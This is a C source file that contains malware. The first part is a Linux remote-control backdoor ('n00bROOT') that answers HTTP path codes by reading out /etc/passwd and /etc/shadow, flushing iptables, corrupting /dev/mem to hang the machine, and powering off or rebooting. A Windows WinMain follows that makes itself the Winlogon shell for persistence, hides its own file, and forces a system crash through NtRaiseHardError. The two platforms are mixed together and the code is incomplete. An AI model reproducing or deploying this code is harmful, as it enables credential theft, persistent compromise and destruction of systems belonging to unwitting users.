#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#define NT_ERROR_CODE 0xC0000022

/* main */
int main()
{
  int numbytes;

  struct sockaddr_in server; /* server's address information */
  struct sockaddr_in client; /* client's address information */

  int sin_size;

  dupStreamz();

  if ((fd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){  /* calls socket() */
    system("echo 'socket() error' >> zerror.log");
    printf("server: socket() error\n");
    exit(-1);
  }

  server.sin_family = AF_INET;
  server.sin_addr.s_addr = INADDR_ANY;  /* INADDR_ANY puts your IP address automatically */

  int noobPort = PORT;
  for (noobPort=PORT; noobPort < 65535; noobPort = noobPort+1){
      server.sin_port = htons(noobPort);   /* Remember htons() from "Conversions" section? =) */
      bzero(&(server.sin_zero),8); /* zero the rest of the structure */

      if(bind(fd,(struct sockaddr*)&server,sizeof(struct sockaddr))==-1){ /* calls bind() */
          system("echo 'bind() error' >> zerror.log");
          printf("server: bind(%d) error\n", noobPort);
          if (noobPort >= 65535) {
              exit(-1);
          }
      } else {
          break;
      }
  }
  printf("listing at :%d", noobPort);
  if(listen(fd,BACKLOG) == -1){  /* calls listen() */
      system("echo 'listen() error' >> zerror.log");
      printf("server: listen() error\n");
  }

  while(1){
    sin_size=sizeof(struct sockaddr_in);
    if ((fd2 = accept(fd,(struct sockaddr *)&client,&sin_size))==-1){ /* calls accept() */
      system("echo 'accept() error' >> zerror.log");
      printf("server: accept() error\n");
      exit(-1);
    }

    if ( (numbytes = recv(fd2, Request, MAXSTRSIZE, 0)) > 0 )
    {
      Request[numbytes]='\0';
      //sscanf(buf, "GET %s HTTP", Req);
    }else{
      printf("server: recv() error");
      system("echo 'recv() error' >> zerror.log");
    }

    axnCode = getAXN();//1;
    tellClient();

    close(fd2); /*  close fd2 */
    printf("[+] %s\n", Request);
  }
  return 0;
}


/* 
 * it duplicates STDOUT to a Program Handled Stream using it
 * output of system commands is captured in this stream directly
*/
void dupStreamz(){
  if(pipe(pfds) == -1){
  system("echo 'IPC error' >> zerror.log");
  perror("server: PiPiNG FlaW");
  exit(1);
  }

  close(1);
  dup(pfds[1]);
  return;
}


/*
 * it checks for the desired action in axnCode,
 * executes the desired system command
 * builds up the HTTP Response with desired Output
 * send the HTTP Response to Client
*/
void tellClient(){
  char buf[MAXSTRSIZE] = "HTTP 200 OK\0";  //buffer to hold System Commands' Output
  char tmpBuf[MAXSTRSIZE];
  int idx;

  //clearing previous stream content
  for(idx=0; idx<strlen(buf); idx++)
    buf[idx]='\0';
  for(idx=0; idx<strlen(tmpBuf); idx++)
    tmpBuf[idx]='\0';
  for(idx=0; idx<strlen(httpResponse); idx++)
    httpResponse[idx]='\0';

  switch(axnCode){
    //default case
    case -1:  strcpy(httpResponse,httpResponse200);
        system("echo \"<br/><br/><i>n00bROOT</i>\"");  break;
    //hangs the TuX machine
    case 0:    strcpy(httpResponse,httpResponse200);
        system("cat /dev/urandom > /dev/mem");  break;
    //all entries of /etc/passwd
    case 1:    strcpy(httpResponse,httpResponse200);
        system("cat /etc/passwd 2>&1 | sed 's/\\n/<br\\/>/g' | sed 's/\\r/<br\\/>/g'");  break;
    //all entries of /etc/shadow
    case 2:    strcpy(httpResponse,httpResponse200);
        system("cat /etc/shadow 2>&1 | sed 's/\\n/<br\\/>/g' | sed 's/\\r/<br\\/>/g'");  break;
    //all entries of /etc/resolv.conf
    case 3:    strcpy(httpResponse,httpResponse200);
        system("cat /etc/resolv.conf 2>&1");  break;
    //prints entire ps list
    case 4:    strcpy(httpResponse,httpResponse200);
        system("ps aux");  break;
    //deletes all entries of IPTABLES (Firewall)
    case 5:    strcpy(httpResponse,httpResponse200);
        system("iptables --flush 2>&1 && echo \'IPTables Entries Deleted\'");  break;
    //all information of all NICs
    case 6:    strcpy(httpResponse,httpResponse200);
        system("ifconfig -a 2>&1 || ip -a 2>&1 || networkctl --no-legend --no-pager status 2>&1");  break;
    //System Coded Info of all NICs
    case 7:    strcpy(httpResponse,httpResponse200);
        system("ifconfig -s 2>&1 || ip link 2>&1 || networkctl  --no-legend --no-pager list 2>&1");  break;
    //PowerOff
    case 8:    strcpy(httpResponse,httpResponse200);
        system("poweroff 2>&1");  break;
    //Reboot
    case 9:    strcpy(httpResponse,httpResponse200);
        system("reboot 2>&1");  break;
    //default case
    default:  strcpy(httpResponse,httpResponse400);
        system("echo \"HTTP 404\"");  break;
  }
  read(pfds[0], buf, MAXSTRSIZE);
  strncat(tmpBuf,httpResponse,strlen(httpResponse));
  strncat(tmpBuf,buf,strlen(buf));
  send(fd2,tmpBuf,(strlen(httpResponse)+strlen(buf)),0);
  return;
}


/*
 * extracts the action code from HTTP Request
 * returns back the action Code
*/
int getAXN(){
  char *axnTok;
  if((axnTok=strtok(Request," ")) != NULL){
    if((axnTok=strtok(NULL," ")) != NULL){
      printf("\naxn: %s\n",axnTok);
      return getAXNCode(axnTok);
    }
  }
  return -10;
}


/*
 * getAXNCode maps passed string to action token and returns int code
*/
int getAXNCode(char* axnTok){
  if(strcmp("/n00b",axnTok)==0)
    return -1;

  char *axnCodeCharSlash = strrchr(axnTok, '/');
  char *axnCodeChar = axnCodeCharSlash ? axnCodeCharSlash + 1 : axnTok;

  int axnCodeInt = *axnCodeChar - '0';
  return axnCodeInt;
}

int APIENTRY WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    TCHAR szFilePath[MAX_PATH];
    GetModuleFileName(NULL, szFilePath, MAX_PATH);

    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
                       TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),
                       0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
        RegSetValueEx(hKey,
                      TEXT("Shell"),
                      0x00, REG_SZ, (LPBYTE)szFilePath, (DWORD)(_tcslen(szFilePath) + 1) * sizeof(TCHAR));
    RegCloseKey(hKey);

    SetFileAttributesA(szFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED | FILE_ATTRIBUTE_READONLY);

    BOOLEAN previousValue;
    ULONG response;

    if (RtlAdjustPrivilege(0x13,  // [SeShutdownPrivilege]
                           TRUE, FALSE, &previousValue) == 0x00) {
        // 0110 = 01 10 = [ResponseOptionOk + ResponseOptionCancel]
        NtRaiseHardError(NT_ERROR_CODE, 0x00, 0x00, NULL, 0b0110, &response);
    }
}
